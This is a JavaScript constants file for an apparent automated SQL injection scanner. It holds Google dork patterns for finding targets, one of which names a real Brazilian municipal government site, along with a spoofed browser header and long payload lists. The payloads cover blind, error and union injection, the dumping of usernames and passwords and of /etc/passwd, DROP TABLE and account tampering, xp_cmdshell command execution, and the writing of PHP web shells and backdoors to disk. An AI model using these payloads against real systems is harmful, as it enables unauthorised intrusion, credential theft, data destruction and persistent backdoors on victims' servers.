// Configuration constants
export const TIMEOUT_MS = 10000;
export const GOOGLE_SEARCH_DELAY = 10000;
export const MAX_RESULTS = 100;
// HTTP Headers
export const HEADERS = {
  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
  'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'Accept-Language': 'en-US,en;q=0.5',
  'Connection': 'keep-alive',
  'Cache-Control': 'no-cache',
  'Pragma': 'no-cache',
  'DNT': '1'
};

// Extended dork patterns for SQL injection testing
export const DORK_PATTERNS = [
  'inurl:/phpMyAdmin/index.php db=',
  'inurl:cartao.php?id=',
  'inurl:cartoes.php?id=',
  'inurl:hospede.php?id=',
  'inurl:detalhes.php?id=',
  'site: pmfi.pr.gov.br inurl: id='
];

// Basic detection payloads
export const DETECTION_PAYLOADS = [
  "' OR '1'='1",
  "' OR 1=1--",
  "' OR 1=1#",
  "' OR 1=1/*",
  "') OR '1'='1",
  "')) OR (('1'='1",
  "' UNION SELECT NULL--",
  "admin' --",
  "admin' #",
  "' OR 'x'='x",
  "' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'",
  "' AND 1=0 UNION ALL SELECT NULL,NULL,NULL--",
  "1' ORDER BY 1--+",
  "1' ORDER BY 2--+",
  "1' ORDER BY 3--+",
  "1' GROUP BY 1,2,--+"
];

// Time-based blind SQL injection payloads
export const BLIND_PAYLOADS = [
  "' AND (SELECT * FROM (SELECT(SLEEP(2)))a)--",
  "' AND SLEEP(2)--",
  "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 AND SLEEP(2)--",
  "1' AND SLEEP(2) AND '1'='1",
  "' AND IF((SELECT COUNT(*) FROM users)>0,SLEEP(2),0)--",
  "' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(2),0)--",
  "') AND (SELECT * FROM (SELECT(SLEEP(2)))a)-- ",
  "' WAITFOR DELAY '0:0:2'--"
];

// Error-based SQL injection payloads
export const ERROR_PAYLOADS = [
  "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",
  "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x3a,(SELECT database()))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",
  "' AND extractvalue(1,concat(0x3a,(SELECT database())))--",
  "' AND updatexml(1,concat(0x3a,(SELECT database())),1)--",
  "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT DISTINCT CONCAT(0x3a,schema_name) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--"
];

// Union-based SQL injection payloads for column enumeration
export const COLUMN_PAYLOADS = [
  "' UNION ALL SELECT NULL--",
  "' UNION ALL SELECT NULL,NULL--",
  "' UNION ALL SELECT NULL,NULL,NULL--",
  "' UNION ALL SELECT NULL,NULL,NULL,NULL--",
  "' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL--",
  "' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL--",
  "' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
  "' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--"
];

// Data extraction payloads
export const DATA_EXTRACTION_PAYLOADS = [
  // Database information
  "' UNION SELECT CONCAT(schema_name,'::'),NULL FROM information_schema.schemata--",
  "' UNION SELECT CONCAT(table_name,'::'),NULL FROM information_schema.tables WHERE table_schema=database()--",
  "' UNION SELECT CONCAT(column_name,'::'),NULL FROM information_schema.columns WHERE table_schema=database()--",

  // User table extraction
  "' UNION SELECT CONCAT(username,'::',password),NULL FROM users--",
  "' UNION SELECT CONCAT(user,'::',password),NULL FROM user--",
  "' UNION SELECT CONCAT(name,'::',pass),NULL FROM admin--",
  "' UNION SELECT GROUP_CONCAT(table_name SEPARATOR '::'),NULL FROM information_schema.tables WHERE table_schema=database()--",

  // System information
  "' UNION SELECT CONCAT(@@version,'::',@@datadir),NULL--",
  "' UNION SELECT CONCAT(user(),'::',database()),NULL--",
  "' UNION SELECT CONCAT(super_priv,'::',file_priv),NULL FROM mysql.user WHERE user=current_user--",

  // File system access
  "' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--",
  "' UNION SELECT LOAD_FILE('/var/www/html/config.php'),NULL--",

  // Advanced data extraction
  "' AND (SELECT GROUP_CONCAT(table_name SEPARATOR '::') FROM information_schema.tables WHERE table_schema=database())--",
  "' AND (SELECT GROUP_CONCAT(column_name SEPARATOR '::') FROM information_schema.columns WHERE table_schema=database())--",
  "' AND (SELECT GROUP_CONCAT(CONCAT(username,'::',password) SEPARATOR '::') FROM users)--"
];

// Advanced exploitation payloads
export const ADVANCED_PAYLOADS = [
  // Stacked queries
  "'; DROP TABLE users--",
  "'; UPDATE users SET password='hacked' WHERE username='admin'--",
  "'; INSERT INTO users (username,password) VALUES ('hacker','pwned')--",

  // Command execution attempts
  "'; DECLARE @cmd VARCHAR(255); SET @cmd = 'ping 10.10.10.10'; EXEC master..xp_cmdshell @cmd;--",
  "'; exec master..xp_cmdshell 'net user';--",
  "'; EXEC xp_cmdshell 'echo vulnerable > C:\\vuln.txt'--",

  // File operations
  "'; SELECT '<?php system($_GET[\"cmd\"]);?>' INTO OUTFILE '/var/www/shell.php'--",
  "'; SELECT '<?php eval($_POST[\"code\"]);?>' INTO OUTFILE '/var/www/backdoor.php'--"
];
